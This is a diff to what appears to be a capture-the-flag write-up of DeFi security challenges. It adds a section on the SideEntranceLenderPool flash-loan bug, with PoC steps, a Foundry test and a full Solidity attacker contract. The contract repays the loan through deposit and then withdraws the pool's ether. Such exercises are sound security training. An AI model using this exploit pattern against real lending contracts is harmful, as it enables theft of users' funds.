@@ -1,5 +1,3 @@
-# High 
-
 ### `Unstoppable::flashloan`, Flash loans can be haulted if balance of `Unstoppable::totalSupply` & `Unstoppable::totalAssets` are not 1:1. 
 
 ``` solidity 
@@ -135,4 +133,55 @@ How to spot the bug:
         forwarder.execute(request, sig);
     }
 
+```
+---
+
+
+
+
+### `SideEntranceLenderPool::flashloan`, `address(this).balance` is used a check if the funds have been paid back
+
+### PoC:
+1. borrow money from the pool
+2. side entrance lender pool contract calls execute function inside the attack contract and the execute function specifies to pay back what was borrowed
+3. call withdraw 
+4. transfer the funds over to the recovery address
+
+``` solidity
+    function test_sideEntrance() public checkSolvedByPlayer {
+        AttackerContract attacker = new AttackerContract(address(pool), recovery, ETHER_IN_POOL);
+        attacker.attack();
+    }
+```
+
+``` solidity
+contract AttackerContract {
+    address public recovery;
+    uint256 public amount;
+    SideEntranceLenderPool public pool; 
+
+    constructor(address _pool, address _recovery, uint256 _amount) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+        amount = _amount;
+    }
+
+    receive() external payable {}
+
+    function attack() public {
+        // call flashloan 
+        pool.flashLoan(amount);
+
+        // withdraw the funds
+        pool.withdraw();
+
+        // transfer the funds over to the recovery account 
+        payable(recovery).transfer(amount);
+    }
+
+    function execute() external payable {
+        // deposit the flash loan amount back to the flash loan 
+        pool.deposit{value: msg.value}();
+    }
+}
 ```
